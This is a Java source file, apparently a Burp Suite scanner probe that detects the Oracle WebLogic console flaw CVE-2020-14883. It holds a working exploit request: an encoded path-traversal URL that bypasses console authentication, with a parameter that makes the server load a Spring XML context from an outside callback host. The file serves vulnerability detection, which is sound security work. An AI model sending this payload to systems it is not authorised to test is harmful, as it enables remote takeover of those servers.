package probes;

import burp.*;

import java.util.List;

public class CVE_2020_14883 extends Probe {
    private static final String NAME = "CVE-2020-14883";
    private static final String SEVERITY = "High";
    private static final String DESC = "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows high privileged attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 7.2 (Confidentiality, Integrity and Availability impacts).";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String path = "/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal";
        String payload = "test_handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://%s\")";
        String pollPayload = Utilities.collaborator.generatePayload(true);

        IHttpRequestResponse checkReqResp = getReq(
                requestResponse.getHttpService(),
                path + "?" + String.format(payload, pollPayload)
        );

        IResponseInfo resp = Utilities.helpers.analyzeResponse(checkReqResp.getResponse());
        List<ICookie> setCookie = resp.getCookies();
        if (setCookie.size() > 0) {
            byte[] req = checkReqResp.getRequest();
            for (ICookie cookie : setCookie) {
                if (cookie.getName().equals("ADMINCONSOLESESSION")) {
                    req = Utilities.replaceOrAddHeader(
                            req,
                            "Cookie",
                            cookie.getName() + "=" + cookie.getValue());
                    break;
                }
            }
            checkReqResp = Utilities.callbacks.makeHttpRequest(checkReqResp.getHttpService(), req);
        }

        String detail = Utilities.fetchInteraction(pollPayload);

        if (detail.length() > 0) {
            return new WebLogicIssue(
                    checkReqResp,
                    NAME,
                    DESC + "<br/><br/>" + detail,
                    SEVERITY);
        } else return null;
    }
}
